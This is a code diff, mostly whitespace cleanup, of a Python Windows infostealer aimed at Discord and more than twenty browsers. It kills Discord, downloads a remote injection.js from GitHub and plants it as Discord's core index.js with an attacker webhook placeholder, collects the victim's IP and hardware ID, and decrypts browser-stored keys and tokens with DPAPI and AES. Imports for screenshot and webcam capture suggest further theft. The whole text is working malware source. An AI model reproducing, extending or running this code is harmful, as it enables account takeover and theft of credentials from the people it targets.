@@ -1,74 +1,39 @@
 from base64 import b64decode
-
 from Crypto.Cipher import AES
-
 from win32crypt import CryptUnprotectData
-
 from os import getlogin, listdir
-
 from json import loads
-
 from re import findall
-
 from urllib.request import Request, urlopen
-
 from subprocess import Popen, PIPE
-
 import requests, json, os
-
 from datetime import datetime
-
 from zipfile import ZipFile
-
 import os 
-
 import json 
-
 import base64 
-
 import sqlite3 
-
 import win32crypt 
-
 from Crypto.Cipher import AES  #Works
-
 import shutil 
-
 from datetime import timezone, datetime, timedelta 
-
 from PIL import ImageGrab
-
 import time
-
 import httpx
-
 import cv2
-
 import glob
-
 import subprocess
 
-
-
 tokens = []
-
 cleaned = []
-
 checker = []
-
 webhook_url = "%webhook_url%"
 
-
-
 userprofile = os.getenv('USERPROFILE')
-
 local_app_data_path = os.environ['LOCALAPPDATA']
-
 app_data_path = os.environ['APPDATA']
 
 def inject_into_discord():
-
-
     # Pfad zum Discord-Sitzungsordner
     discord_session_path = os.path.join(os.environ['APPDATA'], 'Discord')
 
@@ -84,171 +49,82 @@ def inject_into_discord():
     print("Sitzungsdaten wurden gelöscht. Sie müssen sich erneut bei Discord anmelden.")
 
     path = fr'{local_app_data_path}\Discord\*\modules\discord_desktop_core-*\discord_desktop_core'
-
-
-
     matching_folders = glob.glob(path)
-
-
-
     url = 'https://raw.githubusercontent.com/Paloox/discordInjectionFile/main/injection.js'
-
     response = requests.get(url)
-
-    
-
     file_content = response.text
-
-
-
     if matching_folders:
-
         target_folder = matching_folders[0]
-
         new_file_path = os.path.join(target_folder, 'index.js')
-
         with open(new_file_path, 'w') as file:
-
             file.write(file_content)
-
-
-
         search_text = "%WEBHOOK_URL_INJECT%"
-
         replace_text = webhook_url
-
         with open(new_file_path, 'r') as file:
-
             data = file.read()
-
             data = data.replace(search_text, replace_text)
-
-
-
         with open(new_file_path, 'w') as file:
-
             file.write(data)
-
-        
-
-
-
-
-
+            
 def start_discord():
-
     subprocess.Popen(fr"{local_app_data_path}\Discord\Update.exe --processStart Discord.exe", shell=True)
 
-
-
-
-
 def kill_discord():
-
     subprocess.Popen("taskkill /F /IM Discord.exe", shell=True)
 
-
-
-
-
 def decrypt(buff, master_key):
-
     try:
-
         return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
-
     except:
-
         return "Error"
 
 def getip():
-
     ip = "None"
-
     try:
-
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-
     except: pass
-
     return ip
 
 def gethwid():
-
     p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-
     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
 
 def get_token():
-
     already_check = []
-
     checker = []
-
     local = os.getenv('LOCALAPPDATA')
-
     roaming = os.getenv('APPDATA')
-
     chrome = local + "\\Google\\Chrome\\User Data"
-
     paths = {
-
         'Discord': roaming + '\\discord',
-
         'Discord Canary': roaming + '\\discordcanary',
-
         'Lightcord': roaming + '\\Lightcord',
-
         'Discord PTB': roaming + '\\discordptb',
-
         'Opera': roaming + '\\Opera Software\\Opera Stable',
-
         'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
-
         'Amigo': local + '\\Amigo\\User Data',
-
         'Torch': local + '\\Torch\\User Data',
-
         'Kometa': local + '\\Kometa\\User Data',
-
         'Orbitum': local + '\\Orbitum\\User Data',
-
         'CentBrowser': local + '\\CentBrowser\\User Data',
-
         '7Star': local + '\\7Star\\7Star\\User Data',
-
         'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
-
         'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
-
         'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
-
         'Chrome': chrome + 'Default',
-
         'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
-
         'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
-
         'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
-
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
-
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-
         'Iridium': local + '\\Iridium\\User Data\\Default'
-
     }
 
     for platform, path in paths.items():
-
         if not os.path.exists(path): continue
-
         try:
-
             with open(path + f"\\Local State", "r") as file:
-
                 key = loads(file.read())['os_crypt']['encrypted_key']
-
                 file.close()
 
         except: continue
